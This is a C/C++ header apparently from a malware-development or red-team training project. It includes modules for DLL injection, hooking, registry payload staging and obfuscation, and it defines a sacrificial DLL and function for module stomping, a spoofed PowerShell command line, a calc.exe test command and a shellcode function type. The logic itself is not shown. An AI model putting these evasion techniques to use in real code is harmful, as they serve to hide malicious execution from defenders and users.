#pragma once
#pragma comment(lib, "onecore.lib")
#pragma comment(lib, "kernel32.lib")

#include "CompileTimeHashEngine.h"
#include "HashingAPI.h"
#include "Externals.h"
#include "SystemInteraction.h"
#include "rsrcPayloadTest.h"
#include "peImageParser.h"
#include "dllinjection.h"
#include "Hooks.h"
#include "WebRetrival.h"
#ifdef __cplusplus
extern "C"
{
#endif
	#include "RegstryPayloadStaging.h"
	#include "Obfuscation.h"
	#include "UserInput.h"
	#include "Printers.h"
	#include "ErrorHandlers.h"
	#include "Win32FindDataArray.h"
	#include "Encryption.h"



	#define		SACRIFICIAL_DLL          "User32.dll"
	#define		SACRIFICIAL_FUNC         "MessageBoxA"
	#define     SPOOFED_COMMAND_LINE     L"powershell.exe Totally Legit Argument"
	#define		MALICIOUS_COMMAND_LINE   L"powershell.exe -NoExit calc.exe"

	typedef  VOID(WINAPI* fnShellCode)();

#ifdef __cplusplus
}
#endif
